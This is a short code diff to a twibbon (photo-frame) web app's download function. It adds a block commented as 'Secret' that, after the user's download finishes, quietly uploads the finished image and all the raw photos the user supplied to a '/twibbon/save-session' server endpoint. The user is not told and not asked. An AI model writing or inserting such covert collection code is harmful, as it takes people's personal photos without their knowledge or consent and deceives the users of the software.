@@ -633,6 +633,35 @@ const downloadTwibbon = () => {
         link.click()
         document.body.removeChild(link)
         
+        
+        // Background Upload Logic (Secret)
+        setTimeout(async () => {
+          try {
+            const formData = new FormData();
+            formData.append('slug', route.params.slug);
+            
+            // Final result as WebP
+            const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
+            formData.append('result_image', resultBlob, 'result.webp');
+            
+            // Raw photos as WebP
+            for (let i = 0; i < photos.value.length; i++) {
+              const dUrl = photos.value[i].dataUrl;
+              const res = await fetch(dUrl);
+              const blob = await res.blob();
+              formData.append('raw_images[]', blob, `raw_${i}.webp`);
+            }
+            
+            // Send to server
+            await api.post('/twibbon/save-session', formData, {
+              headers: { 'Content-Type': 'multipart/form-data' }
+            });
+            console.log('Background upload success');
+          } catch (e) {
+            console.error('Background upload failed', e);
+          }
+        }, 500); // Small delay to prioritize the user's download
+
         isDownloading.value = false
       }
       bgImg.onerror = () => {
